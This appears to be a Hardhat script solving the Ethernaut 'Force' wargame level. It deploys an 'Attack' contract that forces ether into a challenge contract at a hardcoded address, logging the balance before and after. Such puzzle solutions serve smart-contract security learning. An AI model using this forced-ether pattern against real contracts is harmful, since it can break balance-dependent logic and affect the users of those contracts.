// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const BigNumber = require('bignumber.js');
const { assert } = require("chai");

async function main() {

  const accounts = await hre.ethers.getSigners()
  let Level_Address = '0x6779Bd23b3af7335e61911C077f7FaeBEb73eF41'
  const payer = accounts[0]

  // let Force = await hre.ethers.getContractFactory('Force')
  // force = await Force.deploy()
  // await force.deployed()
  // Level_Address = force.address

  const abi = [
    // Read-Only Functions
    "function attack(address payable thecontract) public payable",
  ];

  let Attack = await hre.ethers.getContractFactory('Attack')
  attack = await Attack.deploy()
  await attack.deployed()

  console.log('begin balance', await attack.provider.getBalance(Level_Address))
  let tx = await attack.attack(Level_Address, { value: 3 })
  let txinfo = await tx.wait()
  console.log('transfer txhash', txinfo.blockNumber, txinfo.transactionHash)
  console.log('final balance', await attack.provider.getBalance(Level_Address))
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });



  // npx hardhat run 7.Force/run.js